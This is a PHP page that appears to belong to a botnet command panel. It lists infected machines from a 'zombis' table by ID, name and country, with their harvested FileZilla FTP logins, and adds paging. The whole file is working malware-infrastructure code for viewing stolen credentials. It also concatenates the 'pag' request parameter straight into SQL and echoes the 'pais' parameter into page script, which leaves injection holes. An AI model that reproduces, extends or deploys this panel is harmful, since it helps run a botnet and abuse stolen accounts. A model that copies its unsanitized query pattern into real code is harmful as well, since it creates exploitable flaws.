<?php 

require_once('../includes.php'); 




$RegistrosAMostrar=100;

if(isset($_GET['pag'])){
	$RegistrosAEmpezar=($_GET['pag']-1)*$RegistrosAMostrar;
	$PagAct=$_GET['pag'];
}else{
	$RegistrosAEmpezar=0;
	$PagAct=1;
	
}




	$Modems = $DB->Select("SELECT * FROM zombis LIMIT " . $RegistrosAEmpezar . " , " . $RegistrosAMostrar);
	


$Totales = $DB->Select("SELECT * FROM zombis"); 

for($i=0; $i<count($Modems); $i++){
	$Modemstxt .= '
	  <td><div align="center"><font color="#C0C0C0">'.$Modems[$i]['id'].'</font></div>
<font color="#C0C0C0"></td>
		<td></font><div align="center"><font color="#C0C0C0">'.$Modems[$i]['name'].'</font></div>
<font color="#C0C0C0"></td>
		<td></font><div align="center"><font color="#C0C0C0">'.$Modems[$i]['pais'].'</font></div>
<font color="#C0C0C0"></td>
    	<td></font><div align="center"><font color="#C0C0C0">'.$Modems[$i]['ftps'].'</font></div></td>
  	</tr>	' ;
}

$NroRegistros=mysql_num_rows(mysql_query("SELECT * FROM zombis"));
$PagAnt=$PagAct-1;
$PagSig=$PagAct+1;
$PagUlt=$NroRegistros/$RegistrosAMostrar;
$Res=$NroRegistros%$RegistrosAMostrar;
if($Res>0) $PagUlt=floor($PagUlt)+1;

?>






<div id="div_pais" name="div_pais" style="color:#FF0000">
<font face="Verdana" size="1" color="#C0C0C0">Login FTP (Filezilla) :</font><font face="Verdana" size="1"> <?php echo count($Totales); ?> 
</font><br>
&nbsp;</div>

<table width='97%' border='1' cellspacing='0' cellpadding='3' style='border-style:solid; border-color:lightgray; font-size: 9px; border-collapse: collapse' bordercolor="#666666" bgcolor="#000000">
  <tr>
    <td width="2%" bordercolor="#CCCCCC"><div align="center">
	<font size="1" face="Verdana" color="#FFFFFF"><i><b>ID</b></i></div></td>
    <td width="7%" bordercolor="#CCCCCC"><div align="center"><i><b>
		<font face="Verdana" size="1" color="#FFFFFF">Bot's</font></b></i></div></td>
		<td width="6%" bordercolor="#CCCCCC"><div align="center"><i><b>
		<font face="Verdana" size="1" color="#FFFFFF">Pais</font></b></i></div></td>
		<td width="84%" bordercolor="#CCCCCC"><div align="center"><i><b>
			<font size="1" face="Verdana" color="#FFFFFF">Login de Filezilla.exe
	</font>  </b>  </i>  </div></td>
  </tr>
<?php echo $Modemstxt ; ?>
</table>

<br>

<?php
echo '<div align="center"><font face="Verdana" size="1" color="#FFFFFF" style="cursor:pointer">' ;
echo "<a onclick=\"FtpsPag('1' , '".$_GET['pais']."')\">First</a> ";
if($PagAct>1) echo "<a onclick=\"FtpsPag('$PagAnt' , '".$_GET['pais']."')\">Previous</a> ";
echo "<strong>Pagina ".$PagAct."/".$PagUlt."</strong>";
if($PagAct<$PagUlt)  echo " <a onclick=\"FtpsPag('$PagSig' , '".$_GET['pais']."')\">Following</a> ";
echo "<a onclick=\"FtpsPag('$PagUlt' , '".$_GET['pais']."')\">Last</a>";
echo '</font></div>' ;
?>